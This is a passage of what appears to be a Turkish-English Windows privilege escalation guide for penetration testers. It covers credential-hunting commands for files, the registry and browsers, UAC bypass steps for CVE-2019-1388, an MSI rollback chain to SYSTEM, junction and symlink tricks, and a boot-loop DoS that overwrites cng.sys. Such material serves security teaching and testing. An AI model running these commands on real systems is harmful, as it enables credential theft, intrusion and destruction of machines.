dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin'deki Credentials

Ayrıca Bin'i içindeki credentials için kontrol etmelisiniz

Birçok program tarafından kaydedilen **recover passwords** işlemi için şunu kullanabilirsiniz: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry'nin içinde

**Credentials içerebilecek diğer olası registry anahtarları**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Tarayıcı Geçmişi

You should check for dbs where passwords from **Chrome or Firefox** are stored.\
Ayrıca tarayıcıların history, bookmarks ve favourites'larını kontrol edin; belki bazı **passwords are** orada saklıdır.

Tools to extract passwords from browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)**, Windows işletim sistemine gömülü, farklı dillerdeki yazılım bileşenleri arasında **iletişim** sağlayan bir teknolojidir. Her COM bileşeni **identified via a class ID (CLSID)** ve her bileşen bir veya daha fazla arayüz (interface) aracılığıyla işlevsellik sunar; bu arayüzler interface IDs (IIDs) ile tanımlanır.

COM sınıfları ve arayüzleri registry içinde sırasıyla **HKEY\CLASSES\ROOT\CLSID** ve **HKEY\CLASSES\ROOT\Interface** altında tanımlanır. Bu registry, **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** birleştirilerek oluşturulan **HKEY\CLASSES\ROOT**'tan meydana gelir.

Bu registry'nin CLSID'leri içinde, bir **InProcServer32** alt kaydı bulabilirsiniz; bu kayıt, bir **default value** ile bir **DLL**'i işaret eder ve **ThreadingModel** adında bir değere sahiptir; bu değer **Apartment** (Tek İpli), **Free** (Çok İpli), **Both** (Tek veya Çok) veya **Neutral** (Thread Neutral) olabilir.

![](<../../images/image (729).png>)

Temelde, eğer yürütülecek DLL'lerden herhangi birini **overwrite any of the DLLs** yapabiliyorsanız, o DLL farklı bir kullanıcı tarafından çalıştırıldığında **escalate privileges** yapabilirsiniz.

To learn how attackers use COM Hijacking as a persistence mechanism check:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

**Search for file contents**
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**Belirli bir dosya adına sahip dosyayı ara**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**Kayıt Defteri'nde anahtar adları ve parolalar ara**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Passwords arayan araçlar

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **is a msf** plugin. Bu plugin'i, hedefin içinde credentials arayan tüm metasploit POST module'lerini otomatik olarak çalıştırmak için oluşturdum.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) otomatik olarak bu sayfada bahsedilen passwords içeren tüm dosyaları arar.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) bir sistemden password çıkarmak için başka harika bir araçtır.

[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) aracı, bu verileri açık metin olarak kaydeden (PuTTY, WinSCP, FileZilla, SuperPuTTY ve RDP) çeşitli araçların sessions, usernames ve passwords'lerini arar.
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

Imagine that **a process running as SYSTEM open a new process** (`OpenProcess()`) with **full access**. The same process **also create a new process** (`CreateProcess()`) **with low privileges but inheriting all the open handles of the main process**.\
Then, if you have **full access to the low privileged process**, you can grab the **open handle to the privileged process created** with `OpenProcess()` and **inject a shellcode**.\
[Bu zafiyeti **nasıl tespit edip istismar edileceği** hakkında daha fazla bilgi için bu örneği okuyun.](leaked-handle-exploitation.md)\
[Farklı izin seviyeleriyle (sadece full access değil) devralınmış süreç ve thread'lerin daha fazla açık handler'ını test etme ve kötüye kullanma hakkında daha kapsamlı bir açıklama için bu **diğer gönderiyi** okuyun.](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Shared memory segments, referred to as **pipes**, enable process communication and data transfer.

Windows provides a feature called **Named Pipes**, allowing unrelated processes to share data, even over different networks. This resembles a client/server architecture, with roles defined as **named pipe server** and **named pipe client**.

When data is sent through a pipe by a **client**, the **server** that set up the pipe has the ability to **take on the identity** of the **client**, assuming it has the necessary **SeImpersonate** rights. Identifying a **privileged process** that communicates via a pipe you can mimic provides an opportunity to **gain higher privileges** by adopting the identity of that process once it interacts with the pipe you established. For instructions on executing such an attack, helpful guides can be found [**here**](named-pipe-client-impersonation.md) and [**here**](#from-high-integrity-to-system).

Also the following tool allows to **intercept a named pipe communication with a tool like burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **and this tool allows to list and see all the pipes to find privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

More details:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Çeşitli

### Windows'ta kod çalıştırabilecek dosya uzantıları

Şu sayfaya göz atın: **[https://filesec.io/](https://filesec.io/)**

### **Parolalar İçin Komut Satırlarını İzleme**

When getting a shell as a user, there may be scheduled tasks or other processes being executed which **pass credentials on the command line**. The script below captures process command lines every two seconds and compares the current state with the previous state, outputting any differences.
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Stealing passwords from processes

## From Low Priv User to NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Eğer grafik arayüzüne (console veya RDP aracılığıyla) erişiminiz varsa ve UAC etkinse, bazı Microsoft Windows sürümlerinde ayrıcalıksız bir kullanıcıdan bir terminali veya "NT\AUTHORITY SYSTEM" gibi herhangi bir başka süreci çalıştırmak mümkündür.

Bu, aynı güvenlik açığıyla aynı anda yetki yükseltmeyi ve UAC'ı atlamayı mümkün kılar. Ayrıca, herhangi bir şey yüklemeye gerek yoktur ve işlem sırasında kullanılan binary, Microsoft tarafından imzalanmış ve yayımlanmıştır.

Some of the affected systems are the following:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
Bu zafiyeti istismar etmek için aşağıdaki adımların gerçekleştirilmesi gereklidir:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
## Administrator için Medium'dan High Integrity Düzeyine / UAC Bypass

Bunu **Bütünlük Düzeylerini öğrenmek için** okuyun:


{{#ref}}
integrity-levels.md
{{#endref}}

Ardından **UAC ve UAC bypass'ları hakkında bilgi edinmek için** bunu okuyun:


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Rastgele Klasör Silme/Taşıma/Yeniden Adlandırma'dan SYSTEM EoP'ye

Bu teknik [**bu blog yazısında**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) açıklanmıştır ve exploit kodu [**burada mevcut**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

Saldırı temelde Windows Installer'ın rollback özelliğini kötüye kullanarak, uninstall işlemi sırasında meşru dosyaların yerine kötü amaçlı olanların konulması esasına dayanır. Bunun için saldırganın `C:\Config.Msi` klasörünü ele geçirmek üzere kullanılacak **kötü amaçlı bir MSI installer** oluşturması gerekir; Windows Installer daha sonra diğer MSI paketlerinin uninstall'u sırasında rollback dosyalarını burada depolayacaktır ve bu rollback dosyaları kötü amaçlı payload içerecek şekilde değiştirilir.

Özet teknik şu şekildedir:

1. Stage 1 – Hijack'e Hazırlık (`C:\Config.Msi`'yi boş bırakın)

- Adım 1: MSI'yi yükleyin
- Yazılabilir bir klasöre (`TARGETDIR`) zararsız bir dosya (örn. `dummy.txt`) kuran bir `.msi` oluşturun.
- Installer'ı **"UAC Compliant"** olarak işaretleyin, böylece bir **non-admin kullanıcı** bunu çalıştırabilir.
- Kurulum sonrası dosyaya bir **handle** açık tutun.

- Adım 2: Uninstall'a Başlayın
- Aynı `.msi`'yi uninstall edin.
- Uninstall işlemi dosyaları `C:\Config.Msi`'ye taşımaya ve bunları `.rbf` dosyalarına yeniden adlandırmaya başlar (rollback yedekleri).
- Dosya `C:\Config.Msi\<random>.rbf` haline geldiğinde tespit etmek için açık dosya handle'ını `GetFinalPathNameByHandle` ile **poll** edin.

- Adım 3: Özel Senkronizasyon
- `.msi` içinde şu işe yarayan bir **custom uninstall action (`SyncOnRbfWritten`)** bulunur:
- `.rbf` yazıldığında sinyal verir.
- Ardından uninstall işlemi devam etmeden önce başka bir event'i **bekler**.

- Adım 4: `.rbf` Silinmesini Engelle
- Sinyal alındığında, `.rbf` dosyasını `FILE_SHARE_DELETE` olmadan **açın** — bu `.rbf` dosyasının **silinmesini engeller**.
- Sonra uninstall'ın bitmesi için **geri sinyal** verin.
- Windows Installer `.rbf`'yi silemez ve tüm içeriği silemediği için **`C:\Config.Msi` kaldırılamaz**.

- Adım 5: `.rbf`'yi Manuel Silin
- Siz (saldırgan) `.rbf` dosyasını manuel olarak silin.
- Şimdi **`C:\Config.Msi` boş**, ele geçirilmek üzere hazır.

> Bu noktada, `C:\Config.Msi`'yi silmek için **SYSTEM seviyesindeki rastgele klasör silme zafiyetini** tetikleyin.

2. Stage 2 – Rollback Script'lerini Kötü Amaçlı Olanlarla Değiştirme

- Adım 6: Zayıf ACL'lerle `C:\Config.Msi`'yi Yeniden Oluştur
- `C:\Config.Msi` klasörünü kendiniz yeniden oluşturun.
- **Zayıf DACL'ler** ayarlayın (ör. Everyone:F) ve `WRITE_DAC` ile bir handle açık tutun.

- Adım 7: Başka Bir Kurulum Başlat
- `.msi`'yi tekrar yükleyin, şu seçeneklerle:
- `TARGETDIR`: Yazılabilir konum.
- `ERROROUT`: zorunlu bir hatayı tetikleyen bir değişken.
- Bu kurulum tekrar **rollback** tetikleyecek ve `.rbs` ile `.rbf` okunacaktır.

- Adım 8: `.rbs`'yi İzle
- Yeni bir `.rbs` görünene kadar `C:\Config.Msi`'yi `ReadDirectoryChangesW` ile izleyin.
- Dosya adını yakalayın.

- Adım 9: Rollback Öncesi Senkronizasyon
- `.msi` içinde bir **custom install action (`SyncBeforeRollback`)** vardır:
- `.rbs` oluşturulduğunda bir event sinyali verir.
- Ardından devam etmeden önce **bekler**.

- Adım 10: Zayıf ACL'yi Tekrar Uygula
- `.rbs oluşturuldu` event'ini aldıktan sonra:
- Windows Installer `C:\Config.Msi` üzerine **güçlü ACL'ler** tekrar uygular.
- Ancak siz hâlâ `WRITE_DAC` ile bir handle tuttuğunuz için **zayıf ACL'leri tekrar uygulayabilirsiniz**.

> ACL'ler **sadece handle açılırken** uygulanır, bu yüzden klasöre hâlâ yazabilirsiniz.

- Adım 11: Sahte `.rbs` ve `.rbf` Bırak
- `.rbs` dosyasını, Windows'a şunu yapmasını söyleyen **sahte bir rollback scripti** ile overwrite edin:
- `.rbf` dosyanızı (kötü amaçlı DLL) **yetkili bir konuma** (örn. `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`) geri yüklemesini söyleyin.
- Kötü amaçlı SYSTEM seviyesinde payload içeren sahte `.rbf`'inizi bırakın.

- Adım 12: Rollback'i Tetikle
- Installer'ın devam etmesi için senkronizasyon event'ini sinyalleyin.
- Bilinen bir noktada kasıtlı olarak kurulumu başarısız kılmak için bir **type 19 custom action (`ErrorOut`)** yapılandırılmıştır.
- Bu, **rollback'in başlamasına** neden olur.

- Adım 13: SYSTEM DLL'inizi Kurar
- Windows Installer:
- Kötü amaçlı `.rbs`'inizi okur.
- `.rbf` DLL'inizi hedef konuma kopyalar.
- Artık **SYSTEM tarafından yüklenen bir yolda kötü amaçlı DLL**'iniz var.

- Son Adım: SYSTEM Kodunu Çalıştır
- DLL'inizi yükleyen güvenilir bir **auto-elevated binary** (örn. `osk.exe`) çalıştırın.
- **Patlama**: Kodunuz **SYSTEM olarak** çalıştırılır.

### Rastgele Dosya Silme/Taşıma/Yeniden Adlandırma'dan SYSTEM EoP'ye

Ana MSI rollback tekniği (öncekiler) tüm bir klasörü (örn. `C:\Config.Msi`) silebildiğinizi varsayar. Peki ya zafiyetiniz yalnızca **rastgele dosya silmeye** izin veriyorsa?

NTFS iç yapılarını kötüye kullanabilirsiniz: her klasörün şu isimde gizli bir alternate data stream'i vardır:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
Bu akış klasörün **indeks meta verisini** saklar.

Yani, bir klasörün **`::$INDEX_ALLOCATION` akışını silerseniz**, NTFS **tüm klasörü** dosya sisteminden kaldırır.

Bunu şu gibi standart dosya silme API'leri kullanarak yapabilirsiniz:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> *file* silme API'sini çağırıyor olsanız da, bu **folder'ın kendisini siler**.

### From Folder Contents Delete to SYSTEM EoP
Eğer primitive'iniz rastgele files/folders silmenize izin vermiyorsa, ancak **attacker-controlled folder'ın *contents*'unu silmeye izin veriyorsa** ne olur?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- **oplock**, yetkili bir işlem `file1.txt`'i silmeye çalıştığında **çalışmayı durdurur**.
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. Adım 3: SYSTEM sürecini tetikleyin (örn. `SilentCleanup`)
- Bu süreç klasörleri tarar (örn. `%TEMP%`) ve içindekileri silmeye çalışır.
- `file1.txt`'e ulaştığında, **oplock tetiklenir** ve kontrolü callback'inize devreder.

4. Adım 4: Oplock callback içinde – silme işlemini yönlendirin

- Seçenek A: `file1.txt`'i başka bir yere taşıyın
- Bu, `folder1`'i oplock'u bozmadan boşaltır.
- `file1.txt`'i doğrudan silmeyin — bu oplock'un erken serbest kalmasına neden olur.

- Seçenek B: `folder1`'i bir **junction**'a dönüştürün:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- Seçenek C: `\RPC Control` içinde bir **symlink** oluşturun:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> Bu, klasör meta verilerini depolayan NTFS dahili akışını hedef alır — onu silmek klasörü siler.

5. Adım 5: Oplock'u serbest bırak
- SYSTEM process devam eder ve `file1.txt`'i silmeye çalışır.
- Ancak şimdi, junction + symlink nedeniyle, aslında siliyor:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` SYSTEM tarafından silinir.

### Arbitrary Folder Create'tan Kalıcı DoS'a

Bir primitive'i istismar edin; bu size **SYSTEM/admin olarak herhangi bir klasör oluşturma** imkanı verir — **dosya yazamıyor olsanız** veya **zayıf izinler ayarlayamıyor olsanız** bile.

Bir **klasör** (dosya değil) oluşturun ve adını bir **kritik Windows driver** ile aynı yapın, örn.:
```
C:\Windows\System32\cng.sys
```
- Bu yol genellikle `cng.sys` çekirdek modlu sürücüsüne karşılık gelir.
- Eğer bunu **önceden klasör olarak oluşturursanız**, Windows gerçek sürücüyü önyüklemede yükleyemez.
- Sonra, Windows önyükleme sırasında `cng.sys`'i yüklemeye çalışır.
- Klasörü görür, **gerçek sürücüyü çözümleyemez** ve **çökme veya önyüklemenin durmasına** yol açar.
- Harici müdahale olmadan (ör. boot repair veya disk erişimi) **geri dönüş yok** ve **kurtarma yok**.

### Ayrıcalıklı log/backup yollarından + OM symlinks ile keyfi dosya üzerine yazma / boot DoS'a

Bir **ayrıcalıklı hizmet** logları/exports'ı **yazılabilir yapılandırma**'dan okunan bir yola yazdığında, bu yolu **Object Manager symlinks + NTFS mount points** ile yönlendirerek ayrıcalıklı yazmayı keyfi dosya üzerine yazmaya dönüştürebilirsiniz (hatta **SeCreateSymbolicLinkPrivilege** olmadan bile).

**Gereksinimler**
- Hedef yolu saklayan yapılandırma dosyasının saldırgan tarafından yazılabilir olması (ör. `%ProgramData%\...\.ini`).
- `\RPC Control` için bir mount point ve bir OM dosya symlink'i oluşturma yeteneği (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).
- O yola yazan ayrıcalıklı bir işlem (log, export, report).

**Örnek zincir**
1. Ayrıcalıklı log hedefini elde etmek için yapılandırmayı okuyun, ör. `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Admin olmadan yolu yönlendir:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Ayrıcalıklı bileşenin logu yazmasını bekleyin (ör. admin "send test SMS" tetikler). Yazma artık `C:\Windows\System32\cng.sys` konumuna gider.
4. Üzerine yazılan hedefi (hex/PE parser) inceleyerek bozulmayı doğrulayın; yeniden başlatma Windows'un değiştirilmiş sürücü yolunu yüklemesini zorlar → **boot loop DoS**. Bu, ayrıcalıklı bir servis tarafından yazma için açılacak herhangi bir korumalı dosya için de genelleştirilebilir.

> `cng.sys` normalde `C:\Windows\System32\drivers\cng.sys`'den yüklenir, ancak `C:\Windows\System32\cng.sys` konumunda bir kopya varsa önce denenebilir, bu da onu bozuk veri için güvenilir bir DoS hedefi yapar.



## **High Integrity'den System'e**

### **Yeni servis**

Zaten bir High Integrity process üzerinde çalışıyorsanız, **SYSTEM'e giden yol** sadece **yeni bir servis oluşturup çalıştırmak** olabilir:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> Servis ikili dosyası oluştururken bunun geçerli bir service olduğundan veya ikilinin gerekli işlemleri hızlıca gerçekleştirdiğinden emin olun; geçerli bir service değilse 20 saniye içinde sonlandırılacaktır.

### AlwaysInstallElevated

Yüksek (High Integrity) bir süreçten **AlwaysInstallElevated kayıt girdilerini etkinleştirmeyi** ve bir _**.msi**_ sarmalayıcı kullanarak bir reverse shell **yüklemeyi** deneyebilirsiniz.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**Bunu yapabilirsiniz** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

Eğer bu token ayrıcalıklarına sahipseniz (muhtemelen zaten High Integrity bir süreçte bulacaksınız), SeDebug ayrıcalığı ile neredeyse herhangi bir süreci (korumalı olmayan süreçler) açabilir, sürecin token'ını kopyalayabilir ve o token ile istediğiniz bir süreç oluşturabilirsiniz.\
Bu teknik genellikle tüm token ayrıcalıklarına sahip SYSTEM olarak çalışan herhangi bir sürecin seçilmesini gerektirir (_evet, tüm token ayrıcalıklarına sahip olmayan SYSTEM süreçleri de bulabilirsiniz_).\
**Bir örneğini** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

Bu teknik meterpreter tarafından getsystem sırasında yetki yükseltmek için kullanılır. Teknik, **bir pipe oluşturmak ve ardından o pipe'a yazması için bir service oluşturmak/kötüye kullanmak** üzerine kuruludur. Ardından, pipe'ı oluşturan ve **`SeImpersonate`** ayrıcalığını kullanan **server**, pipe istemcisinin (service) token'ını **taklit edebilecek** ve SYSTEM ayrıcalıkları elde edecektir.\
If you want to [**learn more about name pipes you should read this**](#named-pipe-client-impersonation).\
If you want to read an example of [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md).

### Dll Hijacking

Eğer SYSTEM olarak çalışan bir sürecin yüklediği bir dll'i **hijack** etmeyi başarırsanız, bu izinlerle rastgele kod çalıştırabilirsiniz. Bu yüzden Dll Hijacking bu tür yetki yükseltmeleri için faydalıdır ve ayrıca high integrity bir süreçten elde edilmesi çok **daha kolaydır**, çünkü dll'lerin yüklendiği klasörlerde **yazma izinlerine** sahip olacaktır.\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**Read:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows yerel yetki yükseltme vektörlerini aramak için en iyi araç:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Yanlış yapılandırmaları ve hassas dosyaları kontrol eder (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Tespit edildi.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- Bazı olası yanlış yapılandırmaları kontrol eder ve bilgi toplar (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Yanlış yapılandırmaları kontrol eder**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- PuTTY, WinSCP, SuperPuTTY, FileZilla ve RDP kayıtlı oturum bilgilerini çıkarır. Lokal kullanım için -Thorough kullanın.**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager'dan kimlik bilgilerini çıkarır. Tespit edildi.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- Toplanan parolaları domain genelinde dener**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh, PowerShell tabanlı bir ADIDNS/LLMNR/mDNS spoofer ve man-in-the-middle aracıdır.**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Temel privesc Windows enumerasyonu**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- Bilinen privesc zaafiyetlerini arar (Watson yerine DEPRECATED)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- Yerel kontroller **(Yönetici hakları gerekli)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- Bilinen privesc zaafiyetlerini arar (VisualStudio kullanılarak derlenmesi gerekir) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- Yanlış yapılandırmaları arayarak hostu enumerate eder (privesc'ten çok bilgi toplama aracı) (derlenmesi gerekir) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- Birçok yazılımdan kimlik bilgilerini çıkarır (github'da precompiled exe mevcut)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp'ın C# portu**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- Yanlış yapılandırmaları kontrol eder (github'da precompiled executable). Önerilmez. Win10'da iyi çalışmıyor.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- Olası yanlış yapılandırmaları kontrol eder (python'dan exe). Önerilmez. Win10'da iyi çalışmıyor.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- Bu gönderiye dayanarak oluşturulmuş araç (proper çalışması için accesschk gerekmez ama kullanabilir).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** çıktısını okuyup çalışacak exploitler önerir (lokal python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** çıktısını okuyup çalışacak exploitler önerir (lokal python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

Projeyi doğru .NET sürümünü kullanarak derlemeniz gerekir ([see this](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). Hedef hostta yüklü .NET sürümünü görmek için şunu yapabilirsiniz:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## Referanslar

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
